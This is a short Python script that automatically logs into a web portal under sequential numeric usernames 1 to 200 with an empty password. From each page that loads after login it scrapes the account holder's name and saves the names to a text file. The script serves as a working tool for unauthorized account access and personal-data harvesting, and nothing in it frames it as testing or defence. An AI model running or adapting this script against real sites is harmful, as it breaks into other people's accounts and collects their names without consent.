import requests
from lxml import html

LOGIN_URL = "LOGIN_URL"
URL = "HOME_URL"

session_requests = requests.session()

# Setup
result = session_requests.get(LOGIN_URL)
tree = html.fromstring(result.text)
teacher_to_student = False

# Set initial user ID
userid = 1
PASSWORD = ''
file = open('data.txt', 'w')

while True:
    USERNAME = str(userid)
    # Create payload
    payload = {
        "username": USERNAME,
        "password": PASSWORD,
    }
    # Perform login
    r = requests.get(LOGIN_URL)
    result = session_requests.post(LOGIN_URL, data = payload, headers = dict(referer = LOGIN_URL))

    # Scrape name
    tree = html.fromstring(result.content)
    name_raw = tree.xpath("//div[@class='channel']//text()")
    name = "".join(name_raw)
    if name == "":
        name = "ERROR"
    print('WRITING ' + str(userid) + " " + str(name))
    if userid <= 1:
        file.write(str(userid) + " " + str(name))
    elif userid >= 2:
        file.write('\n' + str(userid) + " " + str(name))
    if userid == 200:
        file.close()
        break
    userid += 1
